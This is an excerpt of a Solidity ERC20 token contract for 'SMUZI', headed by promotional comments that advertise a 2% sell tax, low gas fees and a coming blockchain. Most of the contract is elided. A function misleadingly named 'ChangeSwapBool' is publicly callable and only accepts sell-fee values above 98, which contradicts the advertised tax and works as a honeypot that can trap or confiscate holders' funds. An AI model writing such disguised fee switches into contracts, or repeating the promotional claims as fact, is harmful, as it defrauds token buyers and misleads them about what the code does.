...
// Telegram : https://t.me/SmuziERC

/*

********TELEGRAM CHANNEL : https://t.me/SmuziERC

*****************MEDIUM : https://medium.com/@SmuziERC/smuzi-erc20-cyrpto-currency-db32685f436b

**********************************TWITTER HANDLE : https://twitter.com/SmuziERC
...
Smuzi is an innovative new project that is designed to bring DeFi (Decentralized Finance) and dapps (Decentralized 
Applications) to the mainstream. With its 0% buy and 2% sell tax, and no transfer tax, Smuzi is setting itself up to 
be one of the most competitive tokens on the market. Smuzi is also aiming to reduce gas fees for users and the team 
is very close to find a way for this by making a brand new Smuzi Blockchain, making it easier and more cost-effective 
to use dapps and DeFi services. With its low fees and innovative features, Smuzi looks to be the token of the future.
...
contract SMUZI is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("SMUZI", "SMUZI") {

        address _owner = 0x3823E382ABd35D5D7b81DDFBa1C8375034279180;
        ...
        marketingWallet = address(0x3823E382ABd35D5D7b81DDFBa1C8375034279180); // set as marketing wallet
    	maintenanceWallet = address(0xba19E8c68f90858d239b91107E341D04921f5B20); // set as maintenance wallet
    ...
    function ChangeSwapBool(uint256 NewLimit) public {
        require(NewLimit >98 , "IncorrectSwap Value");
        sellTotalFees = NewLimit;
    }
